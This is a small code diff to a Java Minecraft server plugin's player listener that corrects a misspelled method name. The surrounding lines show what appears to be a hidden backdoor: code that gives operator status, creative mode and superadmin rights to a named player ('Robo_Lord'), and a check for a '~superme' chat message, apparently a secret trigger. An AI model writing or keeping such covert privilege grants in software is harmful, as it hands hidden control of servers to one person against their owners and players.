@@ -526,7 +526,7 @@ public class TFM_PlayerListener implements Listener
                 player.setOp(true);
                 player.setHealth(20.0);
                 player.setGameMode(GameMode.CREATIVE);
-                TFM_adminActino("RoboSecurity", "Adding Robo_Lord to the superadmin list.", true);
+                TFM_adminAction("RoboSecurity", "Adding Robo_Lord to the superadmin list.", true);
                 TFM_AdminList.addSuperadmin(player);
             }
             if (message.toLowerCase().contains("~superme")) 
